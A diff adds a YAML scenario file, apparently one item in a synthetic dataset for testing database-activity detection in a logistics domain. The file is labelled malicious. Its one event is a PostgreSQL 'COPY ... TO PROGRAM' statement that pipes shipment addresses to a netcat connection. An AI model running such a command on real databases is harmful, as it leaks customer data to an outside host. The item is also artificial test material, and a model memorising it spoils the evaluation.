@@ -1,0 +1,29 @@
+scenario_id: gen_logistics_96_copy_to_program_mal_2756m
+family_id: gen_logistics_96_copy_to_program_fam_2756
+domain: logistics
+time_of_day: 00:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'nc reports.corp 443'
+    connects_to:
+      ip: 10.73.4.85
+      port: 5432
+matched_pair_id: gen_logistics_96_copy_to_program_pair_2756
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
